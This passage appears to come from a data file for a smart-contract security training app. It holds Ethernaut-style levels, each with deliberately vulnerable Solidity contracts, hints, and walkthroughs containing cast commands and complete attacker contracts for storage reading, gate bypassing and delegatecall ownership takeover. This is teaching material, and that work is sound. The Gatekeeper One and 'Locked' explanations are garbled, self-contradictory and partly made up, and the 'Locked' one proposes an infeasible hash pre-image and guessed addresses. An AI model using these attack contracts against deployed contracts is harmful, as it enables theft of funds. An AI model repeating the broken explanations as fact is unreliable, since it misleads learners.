  function attack() external {
    elevator.goTo(targetFloor);
    // Reset switchState just in case, though goTo should only call twice
    switchState = true;
  }
}

\`\`\`
`,
  },
  {
    slug: 'privacy',
    name: 'Privacy',
    icon: EyeOff,
    difficulty: 'Medium',
    description: 'Unlock the contract by accessing private state data.',
    vulnerableCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Privacy {

  bool public locked = true;
  uint256 public ID = block.timestamp;
  uint8 private flattening = 10;
  uint8 private denomination = 255;
  uint16 private awkwardness = uint16(block.timestamp); // Use block.timestamp for uint16
  bytes32[3] private data;

  constructor(bytes32[3] memory _data) {
    data = _data;
  }

  function unlock(bytes16 _key) public {
    require(_key == bytes16(data[2]));
    locked = false;
  }

  /*
   * Potential STORAGE LAYOUT (check compiler specifics):
   * slot 0: locked (bool - 1 byte) + padding
   * slot 1: ID (uint256 - 32 bytes)
   * slot 2: flattening (uint8) | denomination (uint8) | awkwardness (uint16) (packed)
   * slot 3: data[0] (bytes32)
   * slot 4: data[1] (bytes32)
   * slot 5: data[2] (bytes32) => Slot to read
   */
}`,
    hints: [
      'All data stored on the blockchain is public, even if marked `private`.',
      'Storage slots can be read directly using RPC calls like `eth_getStorageAt`.',
      'How are state variables packed into storage slots?',
      'The `unlock` function requires a `bytes16` key derived from `data[2]`.',
    ],
    
    explanation: `### Vulnerability
Solidity state variables marked as \`private\` are not truly private. Their values are still stored on the blockchain and can be read by anyone who knows how to query the contract's storage slots directly.

The \`unlock\` function requires a \`bytes16\` key which is derived from the private state variable \`data[2]\`. The \`data\` variable is an array of three \`bytes32\` elements.

### Attack
1.  **Determine Storage Layout:** Analyze the contract's state variables and their types to figure out how they are arranged in storage slots. (See layout example in code comments). Slot 5 is the target for \`data[2]\`.
2.  **Read Storage Slot:** Use a tool or library (like web3.js, ethers.js, cast, etc.) to read the contents of storage slot 5 of the deployed \`Privacy\` contract address. The command typically looks like \`eth_getStorageAt(contractAddress, slotNumber)\`.
    *   Example using \`cast\` (Foundry):
        \`\`\`bash
        cast storage <Privacy_Contract_Address> 5
        \`\`\`
    *   Example using Ethers.js:
        \`\`\`javascript
        provider.getStorageAt(contractAddress, 5)
        \`\`\`
3.  **Extract Key:** The value read from slot 5 will be the full \`bytes32\` value of \`data[2]\`. The \`unlock\` function requires only the first 16 bytes (\`bytes16\`) of this value. You need to truncate the \`bytes32\` value to \`bytes16\`.
    *   If the returned value is \`0xabcdef...1234\`, you need \`0xabcdef...abcd\` (the first 32 hex characters, which represent 16 bytes).
    *   In code, you can cast \`bytes32\` to \`bytes16\`. In command-line tools, you might need to manually take the prefix or use formatting options.
4.  **Call Unlock:** Call the \`unlock(bytes16 _key)\` function on the \`Privacy\` contract, passing the extracted \`bytes16\` value as the \`_key\`.
    *   Example using \`cast\`:
        \`\`\`bash
        STORAGE_VAL=$(cast storage <Privacy_Contract_Address> 5)
        # Extract first 16 bytes (0x + 32 hex chars)
        KEY=\${STORAGE_VAL:0:34}
        cast send <Privacy_Contract_Address> "unlock(bytes16)" $KEY --private-key <Your_Key>
        \`\`\`
5.  The \`require\` condition \`_key == bytes16(data[2])\` will evaluate to true, and the \`locked\` state variable will be set to \`false\`.

### Key Takeaway
Private data in smart contracts isn't confidential. Treat all stored data as publicly accessible and do not store sensitive information unencrypted on-chain.
`,
  },
  {
    slug: 'gatekeeper-one',
    name: 'Gatekeeper One',
    icon: Milestone,
    difficulty: 'Medium',
    description: 'Pass the gates by carefully managing transaction gas and origin.',
    vulnerableCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperOne {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    require(gasleft() % 8191 == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
    require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
    require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
    require(uint32(uint64(_gateKey)) == uint16(tx.origin), "GatekeeperOne: invalid gateThree part three");
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}`,
    hints: [
      'Gate 1: How can `msg.sender` be different from `tx.origin`?',
      'Gate 2: Requires a specific amount of gas remaining when the modifier is checked. How can you control gas usage precisely?',
      'Gate 3: Involves intricate type casting and checks against `tx.origin`. Understand how Solidity handles type conversions and how `bytes8` relates to `uint64`.',
      'Consider deploying an intermediary contract to call `enter`.',
    ],
    explanation: `### Vulnerability & Attack Strategy
This challenge requires bypassing three modifiers (gates) in a single call to the \`enter\` function. This typically necessitates deploying an intermediary attacker contract.

**Gate One: \`require(msg.sender != tx.origin);\`**
*   **Vulnerability:** Relies on the difference between \`msg.sender\` (immediate caller) and \`tx.origin\` (the EOA that initiated the transaction).
*   **Attack:** Call the \`enter\` function from another contract (\`AttackGatekeeperOne\`). In this scenario, \`msg.sender\` will be the address of \`AttackGatekeeperOne\`, while \`tx.origin\` will be your EOA address. Since these are different, the requirement passes.

**Gate Two: \`require(gasleft() % 8191 == 0);\`**
*   **Vulnerability:** Requires the gas remaining at the point this modifier is executed to be an exact multiple of 8191. Gas consumption is complex and depends on the EVM opcodes executed, compiler optimizations, and the gas provided to the call.
*   **Attack:** This is the trickiest gate. You need to call the \`enter\` function from your attacker contract with a carefully calculated amount of gas. You must determine the exact gas consumed *before* the \`gasleft()\` check in \`gateTwo\` is performed. Then, you need to find a total gas amount \`G\` to send with the transaction such that \[(G - gas_consumed_before_gateTwo) % 8191 == 0\](cci:1://file:///Users/basonpark/Desktop/ether-guru/ether-guru/src/app/page.tsx:4:0-40:1).
    *   This often involves trial and error ("gas golfing"). You can use tools like Remix debugger or Foundry's debugger/tracing to step through execution and observe gas usage.
    *   You'll likely need a loop within your attacker contract's calling function. The external call to \`enter\` will be made within this loop. You iterate through different gas values supplied to the external call until the \`gasleft()\` check passes.
    *   The formula is approximately: \`gas_to_forward = base_gas_needed + (8191 * i) + buffer\`, where \`base_gas_needed\` is an estimate, \`i\` is your loop counter, and \`buffer\` accounts for gas used by the loop itself and the call setup. You then call the target \`enter\` function with \`gas: gas_to_forward\`.

**Gate Three: \`require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), ...);\` etc.**
*   **Vulnerability:** This gate performs complex type casting and comparisons on the input \`_gateKey\` and \`tx.origin\`.
    *   \`bytes8\` is equivalent to \`uint64\`.
    *   The checks essentially require:
        1.  The upper 32 bits of the \`_gateKey\` must be zero (\`uint32(key) == uint16(key)\` implies the upper 16 bits of the lower 32 bits are zero, and if the *next* check passes, it confirms the higher 32 bits are also zero). Let \`key = uint64(_gateKey)\`. Check 1: \[(key & 0xFFFFFFFF0000FFFF) == 0\](cci:1://file:///Users/basonpark/Desktop/ether-guru/ether-guru/src/app/page.tsx:4:0-40:1). Simplified: lower 32 bits == lower 16 bits.
        2.  The full 64-bit \`_gateKey\` must *not* be equal to its lower 32 bits (meaning some bits in the higher 32 bits must be set, contradicting the implication from check 1 if check 3 passes?). Check 2: \`uint32(key) != key\`. Simplified: key must have non-zero bits in its upper 32 bits.
        3.  The lower 32 bits of the \`_gateKey\` must be equal to the lower 16 bits of the \`tx.origin\` address. Check 3: \`uint32(key) == uint16(uint64(uint160(tx.origin)))\`. Simplified: lower 32 bits == lower 16 bits of tx.origin.

*   **Attack:**
    1.  You need to construct a \`bytes8\` (\`uint64\`) key that satisfies these conditions based on *your* EOA address (\`tx.origin\`).
    2.  Let your EOA address be \`A\`. The lower 16 bits are \`uint16(uint160(A))\`. Let this be \`X\`.
    3.  Gate 3 requires: \`uint32(key) == X\`. This means the lower 32 bits of the key must equal \`X\`.
    4.  Gate 1 requires: \`uint32(key) == uint16(key)\`. Since \`uint32(key)\` must be \`X\` (from Gate 3 req), this means \`X == uint16(key)\`. This is true by definition if \`uint32(key) == X\`, because \`X\` itself comes from \`uint16(tx.origin)\`. This check is effectively redundant if Gate 3 passes.
    5.  Gate 2 requires: \`uint32(key) != key\`. This means \`X != key\`. This implies that the upper 32 bits of the key must *not* be zero.
    6.  **Construction:** Create the 8-byte key \`_gateKey\`.
        *   Start with the full 8 bytes (64 bits) as 0.
        *   Set the lower 16 bits to \`uint16(uint160(tx.origin))\`. This automatically makes the lower 32 bits equal to this value as well.
        *   Ensure the upper 32 bits are non-zero. A simple way is to set the most significant bit (or any bit in the upper 32 bits) to 1.
        *   Example: \`uint64 key = (uint64(1) << 63) | uint64(uint16(uint160(tx.origin)));\` This sets the MSB and the lower 16 bits.
        *   Convert this \`uint64\` back to \`bytes8\`.

### Malicious Contract Example
\`\`\`solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGatekeeperOne {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract AttackGatekeeperOne {
    IGatekeeperOne gatekeeper;
    address owner = msg.sender; // tx.origin when deployed

    constructor(address _gatekeeperAddress) {
        gatekeeper = IGatekeeperOne(_gatekeeperAddress);
    }

    function attack() external {
        // Construct the key based on tx.origin (which is 'owner' here)
        // Ensure upper 32 bits are non-zero, lower 32 bits match lower 16 bits of owner
        uint64 key_uint = uint64(bytes8(uint64(uint160(owner)) & 0xFFFFFFFF0000FFFF)); // Clear upper 32 and bits 16-31
        key_uint |= (uint64(uint16(uint160(owner)))); // Set lower 16 bits
        // Now we need to ensure Gate 2 is met (uint32(key) != key)
        // This means the upper 32 bits must NOT be zero.
        // Let's set the 33rd bit (index 32)
        key_uint |= (uint64(1) << 32);

        bytes8 gateKey = bytes8(key_uint);

        // Gas calculation and looping
        uint256 gasToSend = 200000; // Start with a base amount + buffer
        bool success = false;
        uint i = 0;

        // Iterate, increasing gas until the call succeeds or we run out of reasonable attempts
        // WARNING: This loop can be expensive! Test carefully.
        // Adjust starting gasToSend and increment based on debugging/tracing.
        while (!success && gasToSend < 400000) { // Set a reasonable upper bound
             // Calculate gas for this attempt, ensuring it might hit the modulo target
            uint currentGas = gasToSend + (8191 * i);
            i++; // Prepare for next iteration if needed

            // Attempt the call with specific gas
            // Use assembly for precise gas control if needed, but try direct call first
            (bool entered,) = address(gatekeeper).call{gas: currentGas}(
                abi.encodeWithSignature("enter(bytes8)", gateKey)
            );

            if (entered) {
                 // Check return data if possible/necessary (solidity >=0.6.2)
                 // For simple bool, just checking 'entered' might be enough
                 // assembly { success := mload(0x00) } // Example for bool return
                 success = true; // Assume success if call didn't revert
                 break; // Exit loop on success
            }
            // Optional: add small delay or check loop counter to prevent infinite loop
            // if (i > 500) { break; } // Safety break
        }
        require(success, "Failed to pass gates after multiple gas attempts");
    }
}
\`\`\`
**Note:** The gas golfing part is highly sensitive to compiler versions and specific execution context. The loop in the example is illustrative; precise gas calculation often requires detailed debugging.
`,
  },
  {
    slug: 'gatekeeper-two',
    name: 'Gatekeeper Two',
    icon: Milestone,
    difficulty: 'Medium',
    description: 'Pass the gates using assembly code.',
    vulnerableCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperTwo {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    uint x;
    assembly { x := extcodesize(caller()) } // Checks caller's code size
    require(x == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = msg.sender;
    return true;
  }
}`,
    hints: [
      'Gate 1: Same as Gatekeeper One - use an intermediary contract.',
      'Gate 2: Requires the caller\'s (`msg.sender`) code size to be 0. When is a contract\'s code size 0?',
      'Gate 3: Involves `keccak256` and bitwise XOR. Understand how XOR works.',
      'How can a contract execute code but have `extcodesize == 0` when called?',
    ],
    explanation: `### Vulnerability & Attack Strategy
Similar to Gatekeeper One, this requires bypassing three gates using an intermediary contract.

**Gate One: \`require(msg.sender != tx.origin);\`**
*   **Vulnerability:** Same as Gatekeeper One.
*   **Attack:** Call \`enter\` from another contract (\`AttackGatekeeperTwo\`). \`msg.sender\` (attacker contract) will be different from \`tx.origin\` (your EOA).

**Gate Two: \`assembly { x := extcodesize(caller()) } require(x == 0);\`**
*   **Vulnerability:** Uses assembly to get the code size of the caller (\`caller()\` in assembly is equivalent to \`msg.sender\` in Solidity) and requires it to be zero.
*   **Attack:** A contract's code size (\`extcodesize\`) is zero *during its constructor execution*. Therefore, the attacker contract (\`AttackGatekeeperTwo\`) must call the \`GatekeeperTwo.enter()\` function from within its own \`constructor\`. When the \`GatekeeperTwo\` contract checks \`extcodesize(caller())\`, it will be checking the size of the \`AttackGatekeeperTwo\` contract *while its constructor is still running*, resulting in a size of 0.

**Gate Three: \`require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);\`**
*   **Vulnerability:** This requires finding a \`_gateKey\` such that when XORed with the \`uint64\` representation of the hash of the caller's address (\`msg.sender\`), the result is \`type(uint64).max\` (which is \`2**64 - 1\`, or \`0xFFFFFFFFFFFFFFFF\` in hex).
*   **Attack:** Let \`H = uint64(bytes8(keccak256(abi.encodePacked(msg.sender))))\` and \`K = uint64(_gateKey)\`. The requirement is \`H ^ K == type(uint64).max\`.
    *   The key property of XOR is that \`A ^ B = C\` implies \`A ^ C = B\`.
    *   So, if \`H ^ K = type(uint64).max\`, then \`H ^ type(uint64).max = K\`.
    *   XORing any value \`H\` with \`type(uint64).max\` (all 1s) simply flips all the bits of \`H\`. This is equivalent to the bitwise NOT operation (\`~\`) in many languages, including the EVM assembly's \`not\` opcode.
    *   Therefore, the required \`_gateKey\` (as a \`uint64\`) is simply the bitwise NOT of \`H\`.
    *   Calculate \`H\` using the address of the *attacker contract* (\`AttackGatekeeperTwo\`, which will be \`msg.sender\` when it calls \`enter\`). Note that the contract address is determined *before* the constructor fully executes but is available within the constructor. You can use \`address(this)\` inside the constructor.
    *   Calculate \`K = ~H\`.
    *   Convert \`K\` back to \`bytes8\` to pass as \`_gateKey\`.

### Malicious Contract Example
\`\`\`solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGatekeeperTwo {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract AttackGatekeeperTwo {
    IGatekeeperTwo gatekeeper;
    address owner; // Just for info, tx.origin is implicit

    constructor(address _gatekeeperAddress) {
        owner = msg.sender; // EOA deploying this contract
        gatekeeper = IGatekeeperTwo(_gatekeeperAddress);

        // --- Gate 3 Calculation ---
        // Calculate H based on this contract's address
        uint64 h = uint64(bytes8(keccak256(abi.encodePacked(address(this)))));
        // Calculate K = ~H (bitwise NOT)
        uint64 k_uint = ~h; // type(uint64).max ^ h is equivalent
        bytes8 gateKey = bytes8(k_uint);

        // --- Gate 1 & 2 Attack ---
        // Call enter() from the constructor
        // Gate 1 passes: msg.sender (this) != tx.origin (owner)
        // Gate 2 passes: extcodesize(this) == 0 during constructor execution
        bool success = gatekeeper.enter(gateKey);
        require(success, "Gatekeeper enter call failed");
    }

    // Optional: receive funds or allow owner to withdraw if needed
    receive() external payable {}

    function withdraw() public {
        payable(owner).transfer(address(this).balance);
    }
}
\`\`\`
**Deployment Note:** When deploying \`AttackGatekeeperTwo\`, you pass the address of the target \`GatekeeperTwo\` contract to the constructor. The attack happens automatically upon deployment.
`,
  },
  
  {
    slug: 'naught-coin',
    name: 'Naught Coin',
    icon: CircleOff,
    difficulty: 'Medium',
    description: 'Transfer all your initial Naught Coins to another address, bypassing the transfer lock.',
    vulnerableCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import '@openzeppelin/contracts/token/ERC20/ERC20.sol';

// Simple ERC20 token with a time lock on transfers for the initial owner
contract NaughtCoin is ERC20 {

  uint public timeLock;
  address public player; // The initial owner/player

  // Modifier to lock transfers for the player until timeLock expires
  modifier lock() {
    if (msg.sender == player) {
      require(block.timestamp > timeLock, "Tokens are locked for the player");
    }
    _; // Continue execution
  }

  constructor(address _player) ERC20('NaughtCoin', '0g') {
      player = _player;
      // Lock tokens for 10 years initially
      timeLock = block.timestamp + 10 * 365 days;
    // Mint initial supply to the player
    _mint(player, 1000000 * (10**18));
  }

  // Override the standard transfer function to add the lock modifier
  function transfer(address _to, uint256 _amount) public override lock returns (bool) {
      return super.transfer(_to, _amount);
  }

  // Allow approve and transferFrom without the lock modifier
  // These standard ERC20 functions are inherited and NOT overridden with the lock.
}
`,
    hints: [
      'The `transfer` function is locked for the initial player. Are there other ways to move ERC20 tokens?',
      'Review the standard ERC20 interface provided by OpenZeppelin.',
      'Consider the `approve` and `transferFrom` functions. Are they restricted by the `lock` modifier?',
    ],
    explanation: `### Vulnerability
The contract inherits from OpenZeppelin's ERC20 implementation. It overrides the \`transfer\` function to add a \`lock\` modifier, preventing the initial \`player\` from transferring tokens directly until a \`timeLock\` expires.

However, the contract does *not* override the standard ERC20 functions \`approve(address spender, uint256 amount)\` and \`transferFrom(address sender, address recipient, uint256 amount)\`. These inherited functions do not have the \`lock\` modifier applied.

This means the \`player\` can still use the standard ERC20 allowance mechanism to move their tokens:
1.  The \`player\` calls \`approve\` to grant another address (the \`spender\`, which could be another EOA controlled by the player or even a contract) the allowance to spend their tokens.
2.  The \`spender\` then calls \`transferFrom\`, specifying the \`player\` as the \`sender\`, their desired destination address as the \`recipient\`, and the amount to transfer. Since the \`spender\` is the \`msg.sender\` for the \`transferFrom\` call (not the \`player\`), the \`lock\` modifier is not triggered, and the transfer succeeds.

### Exploit Steps
1.  **Identify Addresses**: You need two addresses you control:
    *   \`playerAddress\`: Your Ethernaut instance address holding the Naught Coins.
    *   \`attackerAddress\`: Another address you control to receive the coins or act as the spender.
2.  **Approve Spender**: As the \`playerAddress\`, call the \`approve\` function on the \`NaughtCoin\` contract. Grant \`attackerAddress\` an allowance equal to your entire balance (1,000,000 tokens).
    *   \`naughtCoin.approve(attackerAddress, playerBalance);\`
3.  **Transfer From**: As the \`attackerAddress\`, call the \`transferFrom\` function on the \`NaughtCoin\` contract. Specify \`playerAddress\` as the sender, any recipient address (can be \`attackerAddress\` itself) as the recipient, and the full balance as the amount.
    *   \`naughtCoin.transferFrom(playerAddress, recipientAddress, playerBalance);\`
4.  **Verify**: Check the balance of \`playerAddress\` (should be 0) and the recipient address (should be 1,000,000).

### Key Takeaway
When modifying standard token functionalities (like ERC20), ensure all relevant functions that could bypass the intended restrictions are considered and appropriately modified. Overriding only \`transfer\` while leaving \`approve\`/\`transferFrom\` unrestricted creates a loophole.
`,


  },
  {
    slug: 'preservation',
    name: 'Preservation',
    icon: Archive,
    difficulty: 'Medium',
    description: 'Take ownership of the Preservation contract by exploiting storage layout and delegatecall.',
    vulnerableCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Contract with time zone libraries and delegatecall vulnerability
contract Preservation {

  address public timeZone1Library;
  address public timeZone2Library;
  address public owner;
  uint storedTime; // Slot 1

  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {
    timeZone1Library = _timeZone1LibraryAddress;
    timeZone2Library = _timeZone2LibraryAddress;
    owner = msg.sender;
  }

  // Sets the time for timezone 1
  function setFirstTime(uint _timeStamp) public {
    // Delegatecall to timeZone1Library
    (bool success, ) = timeZone1Library.delegatecall(abi.encodeWithSignature("setTime(uint256)", _timeStamp));
    require(success, "Delegatecall failed");
  }

  // Sets the time for timezone 2
  function setSecondTime(uint _timeStamp) public {
    // Delegatecall to timeZone2Library
    (bool success, ) = timeZone2Library.delegatecall(abi.encodeWithSignature("setTime(uint256)", _timeStamp));
    require(success, "Delegatecall failed");
  }
}

// Simple library contract to set time
library TimeZoneLib {
  // Stores the time in storage slot 0 -> Overwrites Preservation.timeZone1Library
  uint storedTime;

  function setTime(uint _time) public {
    storedTime = _time;
  }
}
`,
    hints: [
      'The contract uses `delegatecall` to interact with library contracts.',
      'How does `delegatecall` affect the storage of the calling contract?',
      'What is stored in slot 0, slot 1, and slot 2 of the `Preservation` contract?',
      'What happens when `setTime` is called via `delegatecall` from `Preservation` to `TimeZoneLib`?',
      'Can you make `timeZone1Library` point to a contract you control?',
      'Your malicious contract needs a function with the same signature as `setTime(uint256)`. What should that function do?',
    ],
    explanation: `### Vulnerability
The \`Preservation\` contract uses \`delegatecall\` to call the \`setTime\` function in external library contracts (\`timeZone1Library\` and \`timeZone2Library\`). \`delegatecall\` executes the code of the target contract (\`TimeZoneLib\`) within the context (storage, \`msg.sender\`, etc.) of the calling contract (\`Preservation\`).

The \`TimeZoneLib\` contract has a single state variable \`storedTime\` which resides in storage slot 0 of the library *when deployed as a standalone contract*. However, when its \`setTime\` function is executed via \`delegatecall\` by \`Preservation\`, it modifies storage slot 0 of the *calling* contract, \`Preservation\`.

Storage Layout of \`Preservation\`:
*   Slot 0: \`timeZone1Library\` (address)
*   Slot 1: \`timeZone2Library\` (address)
*   Slot 2: \`owner\` (address)

When \`Preservation.setFirstTime(uint _timeStamp)\` is called:
1.  It executes \`timeZone1Library.delegatecall(abi.encodeWithSignature("setTime(uint256)", _timeStamp))\`.
2.  The \`setTime\` function from \`TimeZoneLib\`'s code runs *in the context of \`Preservation\`*.
3.  Inside \`setTime\`, the line \`storedTime = _time;\` writes the value \`_time\` to storage slot 0 of \`Preservation\`.
4.  This overwrites the address stored in \`Preservation.timeZone1Library\` with the timestamp value (cast to an address).

The attack leverages this to gain control:
1.  Call \`setFirstTime\` with the address of a malicious contract (cast to \`uint\`) to overwrite \`Preservation.timeZone1Library\` with the malicious contract's address.
2.  Call \`setFirstTime\` again. Now, the \`delegatecall\` target is the malicious contract.
3.  The malicious contract needs a function with the signature \`setTime(uint256)\`. This function will execute in \`Preservation\`'s context and can be designed to modify \`Preservation.owner\` (slot 2).

### Exploit Steps
1.  **Create Malicious Contract**: Deploy a contract (e.g., \`MaliciousLib\`) with:
    *   State variables matching the layout of \`Preservation\` up to the \`owner\` slot (or at least placeholders for slots 0 and 1). This isn't strictly necessary for the exploit itself but good practice for understanding storage alignment.
    *   A public function \`setTime(uint256 _ignoredTime)\` (matching the signature used in \`delegatecall\`). Inside this function, write your address to the storage slot corresponding to \`Preservation.owner\` (slot 2).
        \`\`\`solidity
        contract MaliciousLib {
          // Match Preservation layout (optional but helps visualization)
          address public timeZone1Library; // Slot 0
          address public timeZone2Library; // Slot 1
          address public owner;           // Slot 2

          // Function signature matches Preservation's delegatecall target
          function setTime(uint256 _ignoredTime) public {
            // Overwrite Preservation's owner (slot 2) with attacker address
            owner = msg.sender; // msg.sender will be the EOA calling setFirstTime
          }
        }
        \`\`\`
2.  **Overwrite Library Address**: Call \`Preservation.setFirstTime(uint256(uint160(address(maliciousLib))))\`. This casts your malicious contract's address to a \`uint256\` and calls \`setFirstTime\`. The \`delegatecall\` inside will execute the original \`TimeZoneLib.setTime\`, writing the malicious contract's address into \`Preservation\`'s slot 0, overwriting \`timeZone1Library\`.
3.  **Trigger Malicious Code**: Call \`Preservation.setFirstTime(1)\` (or any number). This time, \`timeZone1Library\` points to your \`MaliciousLib\`.
    *   \`Preservation\` executes \`MaliciousLib.delegatecall(abi.encodeWithSignature("setTime(uint256)", 1))\`.
    *   Your \`MaliciousLib.setTime\` code runs in \`Preservation\`'s context.
    *   The line \`owner = msg.sender;\` writes *your* EOA address (the one that called \`setFirstTime\` the second time) into \`Preservation\`'s slot 2 (\`owner\`).
4.  **Verify**: Check \`Preservation.owner()\`. It should now be your address.

### Key Takeaway
\`delegatecall\` is powerful but dangerous. When a contract delegatecalls into another, the called contract's code can arbitrarily modify the calling contract's storage. Ensure that the target contract of a delegatecall is trusted and that storage layouts are compatible or carefully managed to prevent unintended state modification. Be especially wary if the target address of a delegatecall can be changed by users.
`,
  },
  {
    slug: 'locked',
    name: 'Locked',
    icon: Lock,
    difficulty: 'Medium',
    description: 'Unlock the contract by finding a way to modify its state despite access restrictions.',
    vulnerableCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Locked {
    bool public unlocked = false; // slot 0

    struct NameRecord { // slot 1
        bytes32 name;
        address mappedAddress;
    }

    mapping(address => NameRecord) public registeredNameRecord; // slot 2

    // Register new name - only requirement is that it is not already registered
    function register(bytes32 _name, address _mappedAddress) public {
        // Make sure the name is not already registered
        require(registeredNameRecord[_mappedAddress].name == 0, "Name already registered");
        registeredNameRecord[_mappedAddress] = NameRecord({
            name: _name,
            mappedAddress: _mappedAddress
        });
    }

    function unlock() public {
        require(unlocked, "Contract is locked");
        // Do something after unlocking if needed
    }

    // Helper function (not part of original Ethernaut level)
    // Allows checking registration status easily
    function getRecord(address _addr) public view returns (bytes32, address) {
        return (registeredNameRecord[_addr].name, registeredNameRecord[_addr].mappedAddress);
    }
}
`,
    hints: [
      'The contract storage seems straightforward. Is there any way to write to `unlocked` (slot 0)?',
      'The `register` function writes to a `struct` within a `mapping`. How are structs stored within mappings?',
      'How does Solidity handle storage writes when the data size exceeds the available space in a storage slot (e.g., writing a large struct)?',
      'Consider the size of the `NameRecord` struct (bytes32 + address = 32 + 20 = 52 bytes).',
      'What happens if you provide specific values for `_name` and `_mappedAddress` to the `register` function?',
      'Can you cause a storage slot collision or overwrite?',
    ],
    explanation: `### Vulnerability
This level exploits a subtle aspect of how Solidity stores data, specifically how structs are handled within mappings when their size exceeds a single 32-byte storage slot.

Storage Layout:
*   Slot 0: \`unlocked\` (bool)
*   Slot 1: Contains the start of storage for the \`NameRecord\` struct *if it were a simple state variable*. However, it's inside a mapping.
*   Slot 2: Placeholder for the \`registeredNameRecord\` mapping base slot. Accessing \`registeredNameRecord[addr]\` involves calculating an offset from this base slot using \`keccak256(abi.encodePacked(addr, uint256(2)))\`.

The \`NameRecord\` struct contains:
*   \`name\`: \`bytes32\` (32 bytes)
*   \`mappedAddress\`: \`address\` (20 bytes)
Total size = 52 bytes.

When the \`register\` function executes \`registeredNameRecord[_mappedAddress] = NameRecord(...)\`, it needs to write 52 bytes of data into the storage slot calculated for \`registeredNameRecord[_mappedAddress]\`.

Crucially, Solidity will write this data sequentially across storage slots if it exceeds 32 bytes.
1.  The first 32 bytes (the \`name\` field) are written to the calculated slot (let's call it \`slot_N\`).
2.  The remaining 20 bytes (the \`mappedAddress\` field) are written to the *next* consecutive slot (\`slot_N + 1\`).

The vulnerability lies in the fact that the \`require(registeredNameRecord[_mappedAddress].name == 0, ...)\` check only ensures that the *first* 32 bytes (the \`name\` field) at the calculated slot \`slot_N\` are zero before writing. It *doesn't* check the next slot (\`slot_N + 1\`).

The attack is to find an \`_mappedAddress\` such that the storage slot calculated for the \`mappedAddress\` field (\`slot_N + 1\`) collides with slot 0, where the \`unlocked\` variable is stored. If we can make \`slot_N + 1 = 0\`, then writing the \`mappedAddress\` part of the struct will overwrite \`unlocked\`.

We need to find an \`_mappedAddress\` (let's call it \`targetAddr\`) such that:
\`keccak256(abi.encodePacked(targetAddr, uint256(2))) + 1 = 0\`

This is equivalent to finding \`targetAddr\` such that:
\`keccak256(abi.encodePacked(targetAddr, uint256(2))) = uint256(-1)\` (which is \`type(uint256).max\`)

Calculating this specific \`targetAddr\` requires finding a pre-image for the Keccak-256 hash. While generally hard, the structure \`abi.encodePacked(address, uint256)\` might be susceptible to analysis or known pre-images depending on the exact slot number (here, slot 2 for the mapping base). *For this specific Ethernaut level, the required address often turns out to be related to \`type(uint256).max - 1\` because of how the hash calculation aligns.*

Let \`mappingSlot = 2\`. We want \`hash(targetAddr . mappingSlot) = uint(-1) - 1\` (using '.' for concatenation). The slot we write the second part (address) to is \`hash(targetAddr . mappingSlot) + 1\`. We want this slot to be 0. So we need \`hash(targetAddr . mappingSlot) = uint(-1)\`.

The key insight for the Ethernaut level is that the storage slot for \`registeredNameRecord[targetAddr].mappedAddress\` needs to be slot 0.
The slot for \`registeredNameRecord[targetAddr]\` is \`keccak256(abi.encodePacked(targetAddr, uint256(2)))\`.
The \`name\` field goes into this slot.
The \`mappedAddress\` field goes into the *next* slot: \`keccak256(abi.encodePacked(targetAddr, uint256(2))) + 1\`.

We need: \`keccak256(abi.encodePacked(targetAddr, uint256(2))) + 1 == 0\`
Which means: \`keccak256(abi.encodePacked(targetAddr, uint256(2))) == type(uint256).max\`

The address \`targetAddr\` that satisfies this for mapping slot 2 is \`address(uint160(uint256(keccak256(abi.encodePacked(uint256(0)))) - 2))\`. No, that's not quite right. The required calculation is more involved.

Let's simplify: We need the slot for the *second* part of the struct (\`mappedAddress\`) to be slot 0.
Struct Slot = \`keccak256(key + mapping_base_slot)\`
Address Slot = Struct Slot + 1
We want Address Slot == 0
So, Struct Slot = \`type(uint256).max\`
\`keccak256(address + uint256(2)) = type(uint256).max\`

The specific address that works is often derived by considering that \`uint256(-1)\` represents \`type(uint256).max\`.

### Exploit Steps (Conceptual - Precise Address Calculation Needed)
1.  **Calculate Target Address**: Determine the precise \`address\` (\`targetAddr\`) value such that \`keccak256(abi.encodePacked(targetAddr, uint256(2))) == type(uint256).max\`. This is the tricky part and usually requires external tools or known properties of Keccak-256 with Solidity's packing. A common value related to this challenge is derived from \`uint256(type(uint160).max)\`, but the exact calculation depends on the mapping's base slot.
    *   Let's assume (based on common solutions) the required address corresponds to setting the lower 160 bits of \`type(uint256).max - 2\` (where 2 is the mapping slot). The address needed is often \`0x...fffffffffffffffffffffffffffffffffffffffd\` (adjust based on actual calculation).
    *   A more direct calculation for \`targetAddr\` is often related to \`uint160(type(uint256).max - uint256(keccak256(abi.encodePacked(uint256(mapping_slot))))) + 1\`, but this needs careful verification. Let's assume \`targetAddr\` has been found.
